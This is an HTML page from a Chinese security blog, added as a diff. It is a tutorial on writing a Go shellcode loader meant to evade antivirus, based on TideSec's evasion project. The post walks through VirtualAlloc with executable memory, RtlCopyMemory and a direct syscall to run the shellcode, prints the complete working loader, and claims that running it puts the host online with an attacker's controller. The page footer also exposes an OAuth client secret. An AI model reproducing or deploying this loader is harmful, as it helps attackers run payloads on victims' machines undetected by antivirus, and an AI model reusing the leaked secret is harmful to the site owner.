@@ -1,0 +1,371 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>基于Go加载shellcode(Ⅰ) | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="基于Go加载shellcode(Ⅰ) | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+这里通过TideSec的go免杀项目来从0开始学习
+首先导个包，需要用到如下几个包。
+import (
+	&quot;io/ioutil&quot;
+	&quot;os&quot;
+	&quot;syscall&quot;
+	&quo..." />
+    <meta name="keywords" content="免杀,Golang" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              基于Go加载shellcode(Ⅰ)
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-09-02
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/0FG9kkW6t8/" class="post-tag">
+                  # 免杀
+                </a>
+              
+                <a href="https://le1a.github.io/tag/eI9NmbuONN/" class="post-tag">
+                  # Golang
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>这里通过TideSec的go免杀项目来从0开始学习</p>
+<p>首先导个包，需要用到如下几个包。</p>
+<pre><code class="language-go">import (
+	&quot;io/ioutil&quot;
+	&quot;os&quot;
+	&quot;syscall&quot;
+	&quot;unsafe&quot;
+)
+</code></pre>
+<ul>
+<li>
+<p>io/ioutil  文件操作</p>
+</li>
+<li>
+<p>os           系统操作</p>
+</li>
+<li>
+<p>syscall    syscall包含一个指向底层操作系统原语的接口</p>
+</li>
+<li>
+<p>unsafe    Go指针的操作非常有限，仅支持赋值和取值，不支持指针运算，可以通过unsafe包来达到效果</p>
+</li>
+</ul>
+<p>这里定义一下变量，然后需要通过<code>syscall</code>来加载两个dll，<code>kernel32.dll</code>和<code>ntdll.dll</code>。</p>
+<pre><code class="language-go">var (
+	kernel32 = syscall.MustLoadDLL(&quot;kernel32.dll&quot;)
+	ntdll = syscall.MustLoadDLL(&quot;ntdll.dll&quot;)
+	VirtualAlloc = kernel32.MustFindProc(&quot;VirtualAlloc&quot;)
+	RtlCopyMemory = ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)
+	shellcode_buf = []byte{
+        shellcodedata
+    }
+)
+</code></pre>
+<p>然后这里有一个检查报错的函数，如果有报错就退出并打印报错信息。</p>
+<pre><code class="language-go">func checkErr(err error) {
+   if err != nil {
+      if err.Error() != &quot;The operation completed successfully.&quot; {
+         println(err.Error())
+         os.Exit(1)
+      }
+   }
+}
+</code></pre>
+<p>然后来看下main函数，这里把shellcode赋值过来，然后有个<code>if</code>语句，这里的意思就是说当运行这个程序跟了参数的时候，就从第一个参数读取文件，把文件内容传给shellcode参数。</p>
+<pre><code class="language-go">func main() {
+   shellcode := shellcode_buf
+   if len(os.Args) &gt; 1 {
+      shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
+      checkErr(err)
+      shellcode = shellcodeFileData
+   }
+   addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+   if addr == 0 {
+      checkErr(err)
+   }
+   _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))
+   checkErr(err)
+   syscall.Syscall(addr, 0, 0, 0, 0)
+}
+</code></pre>
+<p>那么前面的都很简单，重点就在于这两段</p>
+<pre><code class="language-go"> addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+</code></pre>
+<pre><code class="language-go">_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))
+</code></pre>
+<p>就来学习一下什么是<code>VirtualAlloc</code>和<code>RtlCopyMemory</code></p>
+<h2 id="virtualalloc">VirtualAlloc</h2>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc文档</a></p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/bc2129bd2f130.png" alt="image-20220902160438292" loading="lazy"></figure>
+<p>这个函数就是用来申请内存空间的。把申请到的内存空间赋给addr，如果有报错信息就赋给err。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/8224ae61c3cb3.png" alt="image-20220902153843896" loading="lazy"></figure>
+<p>第一个参数是申请的<code>内存初始地址</code>，第二个参数是<code>申请的大小</code>，第三个参数是决定<code>怎么去使用这段内存</code>，这里就采用这个<code>MEM_COMMIT | MEM_RESERVE</code>方法，一整段一起用，并且这里写了默认值。然后第四个参数是决定<code>这段内存的属性</code>，<code>PAGE_EXECUTE_READWRITE</code>可读可写可执行。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/fe26b6897dcb2.png" alt="image-20220902160218566" loading="lazy"></figure>
+<h2 id="rtlcopymemory">RtlCopyMemory</h2>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">RtlCopyMemory</a></p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/2672c0e41dc3d.png" alt="image-20220902161214121" loading="lazy"></figure>
+<p>第一个参数是决定<code>从哪开始写入数据</code>，第二个参数是填<code>要写入内存的数据</code>，第三个参数是<code>数据的长度</code>。</p>
+<p>最后通过syscall把这段内存跑起来，然后就成功加载shellcode了。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/ad5796abcac84.png" alt="image-20220902163602357" loading="lazy"></figure>
+<h2 id="完整代码">完整代码</h2>
+<pre><code class="language-go">package main
+
+import (
+	&quot;io/ioutil&quot;
+	&quot;os&quot;
+	&quot;syscall&quot;
+	&quot;unsafe&quot;
+)
+
+const (
+	MEM_COMMIT = 0x1000
+	MEM_RESERVE = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+var (
+	kernel32 = syscall.MustLoadDLL(&quot;kernel32.dll&quot;)
+	ntdll = syscall.MustLoadDLL(&quot;ntdll.dll&quot;)
+	VirtualAlloc = kernel32.MustFindProc(&quot;VirtualAlloc&quot;)
+	RtlCopyMemory = ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)
+	shellcode_buf = []byte{
+        shellcodedata//填自己的shellcode
+    }
+)
+func checkErr(err error) {
+	if err != nil {
+		if err.Error() != &quot;The operation completed successfully.&quot; {
+			println(err.Error())
+			os.Exit(1)
+		}
+	}
+}
+func main() {
+	shellcode := shellcode_buf
+	if len(os.Args) &gt; 1 {
+		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
+		checkErr(err)
+		shellcode = shellcodeFileData
+	}
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		checkErr(err)
+	}
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))
+	checkErr(err)
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+</code></pre>
+<p>编译之后，运行即可上线</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/8a719b6881cec.png" alt="image-20220902163841137" loading="lazy"></figure>
+<h2 id="免杀效果">免杀效果</h2>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/141e161f4b46a.png" alt="image-20220902163806304" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a>
+<ul>
+<li><a href="#virtualalloc">VirtualAlloc</a></li>
+<li><a href="#rtlcopymemory">RtlCopyMemory</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81">完整代码</a></li>
+<li><a href="#%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C">免杀效果</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/巅峰极客ezweb/">
+              <h3 class="post-title">
+                2022巅峰极客ezweb
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
